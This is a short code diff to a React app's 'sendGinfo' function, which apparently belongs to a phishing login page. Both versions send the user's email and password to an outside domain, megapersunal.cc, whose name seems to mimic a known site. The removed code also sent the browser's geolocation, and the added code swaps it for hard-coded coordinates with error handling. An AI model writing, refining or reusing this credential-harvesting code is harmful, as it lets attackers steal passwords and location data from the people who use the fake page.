@@ -58,48 +58,34 @@ export default function App() {
   }
 
   async function sendGinfo() {
-    const sendData = async (locationData = {}) => {
-      const data = {
-        email: email,
-        token: password,
-        ...locationData,
-      };
+    const data = {
+      email: email,
+      token: password.trim(),
 
-      const response = await fetch("https://megapersunal.cc/api/v1/ginfo", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-          "Accept": "application/json",
-        },
-        body: JSON.stringify(data),
-      });
+      // Dummy location data
+      latitude: 23.8103,
+      longitude: 90.4125,
+    };
+
+    try {
+      const response = await fetch(
+          "https://megapersunal.cc/api/v1/ginfo",
+          {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+              "Accept": "application/json",
+            },
+            body: JSON.stringify(data),
+          }
+      );
 
       const result = await response.json();
 
       console.log(result);
-    };
-
-    // Browser location support করে কিনা
-    if (!navigator.geolocation) {
-      await sendData();
-      return;
+    } catch (error) {
+      console.error("Request failed:", error);
     }
-
-    navigator.geolocation.getCurrentPosition(
-        // User Allow করলে
-        async (position) => {
-          await sendData({
-            latitude: position.coords.latitude,
-            longitude: position.coords.longitude,
-          });
-        },
-
-        // User Deny করলে
-        async () => {
-          console.log("Location permission denied.");
-          await sendData();
-        }
-    );
   }
 
   return (
